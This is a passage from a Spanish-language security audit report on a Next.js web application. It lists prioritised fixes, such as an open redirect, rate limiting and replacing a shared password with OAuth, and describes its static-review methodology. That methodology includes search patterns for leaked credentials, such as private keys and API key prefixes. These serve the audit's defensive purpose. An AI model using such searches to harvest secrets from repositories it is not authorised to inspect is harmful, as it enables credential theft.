9. Token compartido en el `/exec` y saneo del cuerpo del correo (3.2).

### Este mes

10. Eliminar la dependencia de CDN del reporte — Opción A, `window.print()` (4.4).
11. Corregir el open redirect con el parser de URL (4.5).
12. Rate limiting del firewall de Vercel sobre `/acceso` y las actions (5.4).
13. Validación de esquema en las actions que deserializan JSON (2.6).
14. Límites de recursos en el parseo de PDF (5.3).
15. Acotar `/api/diagnostico/exec-post` y excluir `app/api/migracion/` del deploy vía `.vercelignore` (3.1, 3.3).
16. Generación de sesión + vigencia de 24 h (4.3); reducir la exposición de `/api/health` (1.2) y `/api/version` (5.6).

### Deuda estructural (planificar)

17. **Identidades reales en vez de contraseña compartida.** Google OAuth restringido al dominio de la empresa resuelve de una vez: quién entró (auditoría), roles y autorización por recurso, revocación individual, y elimina el secreto compartido que hoy es también la clave de firma de las sesiones. El código ya lo nombra como "el paso previo a los roles" (`lib/auth/acceso.js:16`); conviene que tenga fecha.
18. **`npm audit` en CI.** No existe pipeline de CI en el repositorio; agregarlo cierra la clase de hallazgo 5.2 de forma permanente.
19. **Retirar el `/exec` de Apps Script.** Sustituir `notifyFotoPending` por un proveedor de correo transaccional autenticado y dar de baja el endpoint público (3.2, paso 4).

---

## 7. Notas metodológicas

**Qué se revisó.** Los 51 archivos de `app/`, los 34 de `components/`, los 47 de `lib/`, `proxy.js`, `next.config.mjs`, `package.json`/`package-lock.json`, `apps-script.gs`, `.gitignore`, `.vercelignore`, `.env.local.example`, y los 150 commits del historial.

**Cómo se buscaron secretos.** `git log --all -p -S` sobre `PRIVATE KEY`, `AIza`, `client_secret`, `BEGIN RSA`; `git log --all --name-only` filtrado por patrones de archivos de credenciales; `grep` sobre el árbol de trabajo por `NEXT_PUBLIC`, `process.env`, `eval`, `new Function`, `child_process`, `dangerouslySetInnerHTML`, `innerHTML`, `localStorage`, `sessionStorage`, `document.cookie`.

**Limitaciones de esta auditoría.** Es un análisis estático del código fuente. No se ejecutó la aplicación, no se hicieron pruebas dinámicas contra un deploy, no se auditó la configuración del proyecto de Google Cloud (scopes efectivos de la service account, permisos reales sobre la Unidad compartida), ni la configuración del proyecto en Vercel (variables de entorno realmente definidas, reglas de firewall activas, protección de deploys Preview). Tres verificaciones concretas quedan pendientes y son importantes:

1. **Confirmar que `SITE_PASSWORD` está definida en el entorno de producción de Vercel** y con qué valor de entropía. Es lo primero que determina la gravedad real de gran parte de este reporte.
2. **Confirmar el nivel de acceso del despliegue del `/exec`** en el editor de Apps Script ("cualquier usuario, incluso anónimo" vs. otro), y la cuota restante de `MailApp`.
3. **Confirmar los permisos de la service account** sobre la Unidad compartida: el hallazgo 2.3 escala o se atenúa según cuántos archivos ajenos alcanza. `/api/diagnostico/drive` mide exactamente esto y se puede correr en local.

**Reconocimiento.** El código de este proyecto está inusualmente bien documentado, y varios de los comentarios explican decisiones de seguridad correctas junto con el razonamiento que las respalda (`lib/auth/acceso.js:8-16`, `app/actions/acceso.js:16-27`, `apps-script.gs:90-96`, `.gitignore:13-15`). Eso hizo la auditoría más rápida y, más importante, muestra que las amenazas se pensaron en vez de ignorarse. Los hallazgos de este informe son en buena medida casos en que la intención correcta no llegó a aplicarse de forma completa —el guard que falta en dos rutas de trece, el límite que se valida en el cliente y no en el servidor, el CDN que se sacó de pdf.js pero no del reporte— más que descuidos de fondo.
